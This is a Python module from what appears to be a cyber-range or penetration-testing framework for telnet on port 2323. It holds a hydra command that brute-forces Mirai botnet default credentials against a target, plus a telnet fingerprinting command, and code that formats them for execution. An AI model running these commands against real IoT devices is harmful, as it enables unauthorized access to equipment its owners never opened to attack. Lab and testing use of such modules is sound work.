"""
Telnet Alternate Port — Port 2323
Primarily targeted by Mirai botnet and IoT malware.
"""
from cyber_range.modules.port_23_telnet import EXPLOITS as _BASE

MODULE_INFO = {
    "port": 2323, "service": "telnet-alt",
    "name": "Telnet Alt Port (Mirai Target) Module",
    "description": "Alternate telnet port commonly used by IoT devices — primary Mirai botnet target",
    "author": "Custom", "mitre": ["T1110", "T1078"],
}

EXPLOITS = list(_BASE) + [
    {"name": "Mirai Default Credential Check", "source": "custom", "type": "exploit",
     "msf_module": "",
     "description": "Tests the 62 default credentials used by the Mirai botnet (admin/admin, root/root, etc.)",
     "exec_command": "hydra -C /usr/share/wordlists/mirai-botnet.txt telnet://{target}:2323 -t 4 -f",
     "risk": "Critical — IoT devices on this port often have factory-default credentials"},
    {"name": "IoT Device Fingerprint", "source": "custom", "type": "auxiliary",
     "msf_module": "",
     "description": "Connects to alternate telnet to identify IoT device type and firmware",
     "exec_command": "echo '' | timeout 5 telnet {target} 2323 2>&1 | head -10",
     "risk": "Info — identifies IoT device make/model for targeted exploitation"},
]

def enumerate(target_ip, service_info=None):
    return list(EXPLOITS)

def exploit(target_ip, port=2323, exploit_info=None):
    ei = exploit_info or EXPLOITS[0]
    return {"command": ei["exec_command"].format(target=target_ip),
            "module": ei.get("msf_module", ""), "status": "ready",
            "target": f"{target_ip}:{port}"}
